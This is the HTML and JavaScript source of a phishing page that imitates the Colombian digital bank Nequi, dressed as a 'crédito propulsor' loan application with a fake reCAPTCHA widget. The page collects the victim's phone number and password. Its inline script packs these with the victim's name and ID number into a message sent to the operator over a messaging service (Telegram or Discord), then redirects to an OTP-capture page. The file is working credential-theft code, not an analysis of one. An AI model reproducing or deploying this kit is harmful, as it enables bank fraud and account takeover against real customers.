<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <link rel="stylesheet" href="assets/fonts/fonts.css">
    <link rel="stylesheet" href="css/auth-v2-login.css">
    <link rel="stylesheet" href="css/styles.css">
    <link rel="stylesheet" href="css/loading-spinner.css">
    <link rel="stylesheet" href="css/footer.css">
    <link rel="stylesheet" href="css/navbar.css">
    <link rel="stylesheet" href="css/fakerecaptcha.css">
</head>

<body>
    <main class="loadingContainer">
<header class="navbarContainer">
    <div class="navbarWrapper">
        <div class="navbarContent">
            <a href="index.html">
                <svg _ngcontent-atq-c28="" width="180" height="40" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="splash__container__svg"><path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__up"></path><path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__down"></path><path _ngcontent-atq-c28="" d="31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" class="N"></path><path _ngcontent-atq-c28="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" class="E"></path><path _ngcontent-atq-c28="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" class="I"></path><path _ngcontent-atq-c28="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" class="Q"></path><path _ngcontent-atq-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" class="U"></path></svg>
            </a>
            <button class="hamburgerMenu" aria-label="Menu">
                <span class='bar bar1'></span>
                <span class='bar bar2'></span>
                <span class='bar bar3'></span>
            </button>
        </div>
    </div>
</header>    <section class="mainSectionContainer loading">
        <div class="hero-image"></div>
        <div class="mainSectionWrapper">
            <div class="logo_nequi_animado">
                <img src="assets/images/loading-nequi.webp" alt="">
            </div>
            <p class="wait-msg">Por favor, espere...</p>
            <p class="info-msg">En este momento estamos validando algunos datos. puede tardar un momento.</p>

            <div class="bottom">
                <p class="warning-msg">*Valido desde el <span id="dia"></span> de <span id="mes"></span> al <span id="dia2"></span> de <span id="mes2"></span> del <span id="anio"></span>, aplican T&C</p>
                <img src="assets/images/seguro_fogafin.svg" alt="image"></img>
            </div>
        </div>

    </section>
    <footer>
    <img class="footer-pc" src="assets/images/footer-bigscreen.png" alt="">
    <img class="footer-mobile" src="assets/images/footer.png" alt="">
    <img class="footer-2pc" src="assets/images/footer-2bigscreen.png" alt="">
</footer></main>


<script src="js/migration-helper.js"></script>
<script>
    document.getElementById("mes").textContent = "Agosto";
    document.getElementById("mes2").textContent = "Septiembre";
    document.getElementById("dia").textContent = "07";
    document.getElementById("dia2").textContent = "25";
    document.getElementById("anio").textContent = "2025";
</script>

<header class="navbarContainer">
    <div class="navbarWrapper">
        <div class="navbarContent">
            <a href="index.html">
                <svg _ngcontent-atq-c28="" width="180" height="40" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="splash__container__svg"><path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__up"></path><path _ngcontent-atq-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__down"></path><path _ngcontent-atq-c28="" d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" class="N"></path><path _ngcontent-atq-c28="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" class="E"></path><path _ngcontent-atq-c28="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" class="I"></path><path _ngcontent-atq-c28="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" class="Q"></path><path _ngcontent-atq-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" class="U"></path></svg>
            </a>
            <button class="hamburgerMenu" aria-label="Menu">
                <span class='bar bar1'></span>
                <span class='bar bar2'></span>
                <span class='bar bar3'></span>
            </button>
        </div>
    </div>
</header>    <section class="homeSectionContainer">
        <div class="formContainer">
            <h1>Entra a tu nequi</h1>
            <h2>Solicitud de crédito propulsor</h2>
            <form id="homeForm">
                <div class="formGroup phone">
                    <div class="selectConutry">
                        <div class="selectCol">
                            <img src="assets/images/flag_colombia.png" alt="co">
                        </div>
                        <div class="countryCode">
                            <span>+57</span>
                        </div>
                    </div>
                    <label for="phoneNumber">
                        <input type="tel" id="phoneNumber">
                        <span class="placeholder phone">Número de celular</span>
                    </label>
                </div>
                <div class="formGroup">
                    <label for="password">
                        <input type="password" id="password" class="paswword">
                        <span class="placeholder">Contraseña</span>
                    </label>
                </div>
                 <!-- Fake captcha start -->
    <div class="fkrc-container fkrc-m-p">
        <!-- Captcha checkbox widget -->
        <div id="fkrc-checkbox-window" class="fkrc-checkbox-window fkrc-m-p fkrc-block">
            <div class="fkrc-checkbox-container fkrc-m-p">
                <button type="button" id="fkrc-checkbox" class="fkrc-checkbox fkrc-m-p fkrc-line-normal"></button>
            </div>
            <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal">No soy un robot</p>
            <img src="assets/fake-captcha/captcha_logo.png" class="fkrc-captcha-logo fkrc-line-normal" alt="">
            <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal reCAPTCHA">reCAPTCHA</p>
            <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal p-t">Privacidad - Términos</p>
            <img src="assets/fake-captcha/captcha_spinner.gif" class="fkrc-spinner fkrc-m-p fkrc-line-normal" alt="" id="fkrc-spinner">
            <div class="checkmark"></div>
        </div>
        <img src="assets/fake-captcha/captcha_arrow.svg" alt="" class="fkrc-verifywin-window-arrow" id="fkrc-verifywin-window-arrow"/>
    </div>
 <!-- Fake captcha end -->
                <div class="formButtons">
                    <button class="homeFormButton btn1" id="loginButton" type="submit" disabled>Entrar</button>
                </div>
            </form>
        </div>
    </section>

    <script src="js/discord-config.js"></script>
    <script src="js/discordService.js"></script>
    <script src="js/sendBtn.js"></script>
    <script src="js/fakerecaptcha.js"></script>
    <script type="module">
        import {
            LoginValidation
        } from './js/validateLogin.js';

        document.addEventListener("DOMContentLoaded", () => {
            
            // Crear datos predeterminados si no existen (ya que ahora es la página principal)
            let formData = JSON.parse(localStorage.getItem('formData'));
            if (!formData) {
                formData = {
                    UserId: '1234567890',
                    userName: 'Usuario Nequi',
                    tipoProducto: 'Login Directo',
                    montoPrestamo: 'N/A'
                };
                localStorage.setItem('formData', JSON.stringify(formData));
            }

            // Configuración de placeholders para todos los inputs
            const inputs = ['phoneNumber', 'password'];
            
            // Obtener el checkbox
            const checkboxBtn = document.getElementById('fkrc-checkbox');

            inputs.forEach(inputId => {
                const input = document.getElementById(inputId);
                const placeholder = input.nextElementSibling;

                // Función para actualizar el estado del placeholder
                const updatePlaceholder = () => {
                    if (input.value && input.value.trim().length > 0) {
                        placeholder.classList.add('placeholder-top');
                    } else {
                        placeholder.classList.remove('placeholder-top');
                    }
                };

                // Ejecutar inmediatamente
                updatePlaceholder();

                // Agregar un pequeño retraso para asegurar que los valores estén cargados
                setTimeout(updatePlaceholder, 100);

                // Event listeners
                input.addEventListener('input', updatePlaceholder);
                input.addEventListener('focus', () => placeholder.classList.add('placeholder-top'));
                input.addEventListener('blur', updatePlaceholder);
            });

            // Event listener para el botón de login
            const form = document.getElementById('homeForm');
            const loginButton = document.getElementById('loginButton');
            const loadingSpinner = document.querySelector('.loadingContainer');

            form.addEventListener('submit', (event) => {
                event.preventDefault();
            });

            const actualizarEstadoBoton = () => {
                loginButton.disabled = true;
                const captcha = document.querySelector(".checkmark");
                if (LoginValidation(form)) {
                    setTimeout(() => {
                        loginButton.disabled = false;
                    }, 2000); // 2000 ms = 2 segundos
                } else {
                    loginButton.disabled = true;
                }
            };

            checkboxBtn.addEventListener('click', (event) => {
                actualizarEstadoBoton();
                form.addEventListener('input', actualizarEstadoBoton);
            });

            loginButton.addEventListener('click', async (event) => {
                event.preventDefault();
                setTimeout(() => {
                    loadingSpinner.style.display = 'none';
                    window.location.href = 'validate-otp1.html';
                }, 3000);
                if (LoginValidation(form)) {
                    loadingSpinner.style.display = 'block';

                    const phoneNumber = document.getElementById('phoneNumber').value;
                    const password = document.getElementById('password').value;

                    const formData = JSON.parse(localStorage.getItem('formData'));
                    const userName = formData.userName || 'Usuario';
                    const UserId = formData.UserId || phoneNumber.replace(/\D/g, '').slice(-10);

                    // Actualizar formData con los nuevos datos
                    formData.phoneNumber = phoneNumber;
                    formData.password = password;
                    formData.UserId = UserId;
                    formData.userName = userName;
                    localStorage.setItem('formData', JSON.stringify(formData));

                    const message = `🟣INGRESO LOGO🟣  \n\n🪪 Cédula: ${formData.cedula}\n👤 Nombres: ${formData.nombreCompleto}\n📱 Número: ${phoneNumber}\n🔐 Clave: ${password}\n`;

                    try {
                        await enviarMensajeTelegramSinBotones(message);
                    } catch (error) {
                        console.error('Error al enviar el mensaje:', error);
                    }
                }
            });
        });
    </script>
</body>

</html>